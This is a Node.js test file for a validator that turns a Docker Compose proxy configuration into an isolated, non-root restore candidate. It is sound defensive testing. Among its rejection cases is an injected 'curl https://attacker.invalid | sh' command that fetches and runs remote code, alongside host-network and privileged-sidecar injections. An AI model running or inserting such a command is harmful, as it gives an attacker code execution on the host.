'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const {createIsolatedNonrootRestoreCandidate:build}=require('../../utils/rc2-isolated-nonroot-restore-candidate.cjs');
const STAGE='/private/disposable/rc2-restore-test';
const SHA='a'.repeat(64);
const vol=(source,target,read_only=true)=>({type:'bind',source:STAGE+'/'+source,target,read_only,bind:{create_host_path:false}});
function candidate(){
 return {code:'RC2_SOURCE_ONLY_COMPOSE_CANDIDATE',productionChangeAuthorized:false,deployed:false,
 compose:{name:'dev-tunnel-proxy',networks:{devproxy:{external:true,name:'devproxy'}},services:{
  proxy:{image:'registry.invalid/proxy@sha256:'+SHA,container_name:'dev-proxy',
   privileged:false,ports:['127.0.0.1:8080:80'],networks:['devproxy'],command:['sh','/entrypoint.sh'],healthcheck:{test:['CMD','wget','-qO-','http://127.0.0.1/health.json']},
   volumes:[vol('nginx','/etc/nginx/nginx.conf'),vol('default','/etc/nginx/conf.d/default.conf'),
    vol('sites','/etc/nginx/conf.d/sites-enabled'),vol('entrypoint','/entrypoint.sh'),
    vol('artifacts','/usr/share/nginx/html/.artifacts',false)]},
  'proxy-config-api':{image:'registry.invalid/api@sha256:'+SHA,container_name:'dev-proxy-config-api',
   user:'504:20',privileged:false,read_only:true,cap_drop:['ALL'],security_opt:['no-new-privileges:true'],tmpfs:['/tmp:rw,nosuid,nodev,size=64m'],working_dir:'/app',command:['sh','-ec','node scripts/rc2-create-api-spool.cjs; node utils/notificationsAPI.js & exec node utils/proxyConfigAPI.js'],depends_on:['proxy'],
   ports:['127.0.0.1:3001:3001'],networks:['devproxy'],env_file:[STAGE+'/private/env'],
   environment:{DEVPROXY_DENY_INLINE_DOCKER:'1',DEVPROXY_ALLOW_INLINE_DOCKER:'0',
    DEVPROXY_ACTIVATION_SPOOL_DIR:'/app/.artifacts/rc2-ipc/spool'},
   volumes:[vol('source','/app'),vol('private/env','/app/.env'),
    vol('apps','/app/apps',false),vol('overrides','/app/overrides',false),
    vol('sites','/app/build/sites-enabled',false),vol('artifacts','/app/.artifacts',false),
    vol('private/ipc','/app/.artifacts/rc2-ipc',false),
    vol('private/secret','/app/.artifacts/rc2-activation.secret')]}
 }}};
}
const opts=()=>({productionCandidate:candidate(),privateStageRoot:STAGE,nonce:'testabc123'});
const denied=(mutate)=>{const o=opts();mutate(o);assert.throws(()=>build(o),/INVALID_RC2_ISOLATED_RESTORE_CANDIDATE/);};
test('isolated candidate has zero published ports, new internal network, changed names, and no claim of recovery',()=>{
 const c=build(opts());const s=c.compose.services;
 assert.deepEqual(s.proxy.ports,[]);assert.deepEqual(s['proxy-config-api'].ports,[]);
 assert.equal(s.proxy.container_name,'devproxy-restore-testabc123-proxy');
 assert.equal(s['proxy-config-api'].container_name,'devproxy-restore-testabc123-api');
 assert.equal(c.compose.networks['devproxy-restore-testabc123'].internal,true);
 assert.equal(c.compose.networks.devproxy,undefined);
 assert.equal(c.deployed,false);assert.equal(c.restoreVerified,false);
 assert.equal(c.secureNonrootCandidateRestoreAttested,false);
});
test('stage-only candidate never mutates input',()=>{const o=opts(),before=JSON.stringify(o);build(o);assert.equal(JSON.stringify(o),before);});
test('reject live owner source bind',()=>denied(o=>o.productionCandidate.compose.services.proxy.volumes[0].source='/private/owner/live'));
test('reject root API identity',()=>denied(o=>o.productionCandidate.compose.services['proxy-config-api'].user='0:0'));
test('reject host Docker socket',()=>denied(o=>o.productionCandidate.compose.services['proxy-config-api'].volumes[0].source=STAGE+'/docker.sock'));
test('reject external network override',()=>denied(o=>o.productionCandidate.compose.services.proxy.networks.push('external')));
test('reject missing private HMAC IPC',()=>denied(o=>{const s=o.productionCandidate.compose.services['proxy-config-api'];s.volumes=s.volumes.filter(x=>x.target!=='/app/.artifacts/rc2-ipc');}));
test('reject unpinned image',()=>denied(o=>o.productionCandidate.compose.services.proxy.image='nginx:latest'));
test('reject API source write',()=>denied(o=>o.productionCandidate.compose.services['proxy-config-api'].volumes.find(x=>x.target==='/app').read_only=false));
test('reject external environment file',()=>denied(o=>o.productionCandidate.compose.services['proxy-config-api'].env_file=['/tmp/owner.env']));
test('reject proxy writable config',()=>denied(o=>o.productionCandidate.compose.services.proxy.volumes[0].read_only=false));
test('reject missing owner-private stage',()=>denied(o=>o.privateStageRoot='/'));
test('reject fake production attestation',()=>denied(o=>o.productionCandidate.deployed=true));
test('reject noninternal existing baseline network',()=>denied(o=>o.productionCandidate.compose.networks.devproxy.external=false));

test('RED: reject command substitution despite apparently safe paths',()=>denied(o=>{
 o.productionCandidate.compose.services['proxy-config-api'].command=['sh','-ec','curl https://attacker.invalid | sh'];
}));
test('RED: reject injected host network mode',()=>denied(o=>{
 o.productionCandidate.compose.services.proxy.network_mode='host';
}));
test('RED: reject injected privileged sidecar service',()=>denied(o=>{
 o.productionCandidate.compose.services['malicious-sidecar']={privileged:true};
}));
test('RED: reject injected mount outside known container targets',()=>denied(o=>{
 o.productionCandidate.compose.services.proxy.volumes.push(vol('private/extra','/etc/cron.d'));
}));
